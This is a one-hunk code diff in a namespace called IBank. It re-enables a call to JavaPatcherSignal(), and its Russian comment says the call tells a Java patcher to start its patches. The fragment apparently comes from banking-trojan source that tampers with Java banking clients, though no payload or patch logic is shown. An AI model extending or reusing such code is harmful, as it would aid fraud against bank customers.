@@ -279,7 +279,7 @@ namespace IBank
 
 		// Сигнализируем ява патчеру о необходимости запуска патчей
 		#ifdef JAVS_PATCHERH
-//			JavaPatcherSignal();
+			JavaPatcherSignal();
 		#endif
 
 
